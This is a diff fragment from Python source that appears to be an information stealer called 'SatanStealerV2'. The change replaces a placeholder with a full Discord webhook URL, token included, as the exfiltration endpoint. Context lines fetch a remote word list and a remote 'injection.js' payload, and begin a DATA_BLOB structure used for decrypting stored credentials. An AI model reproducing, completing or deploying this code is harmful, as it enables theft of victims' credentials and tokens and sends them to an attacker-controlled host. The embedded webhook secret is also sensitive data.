@@ -117,7 +117,7 @@ words = "https://rentry.co/5uu99/raw"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "YOUR_WEBHOOK_URL"
+h00k = "https://discord.com/api/webhooks/1433573056349208616/P5nG83lPPcTV3hJzGKD5ixaCKgMticlfPqeI-yDnJogi65VOAL1z9HliCaZ6Afhl9lRJ"
 inj3c710n_url = f"https://raw.githubusercontent.com/HatGirl-zz/SatanStealerV2/main/injection.js"
 
 class DATA_BLOB(Structure):
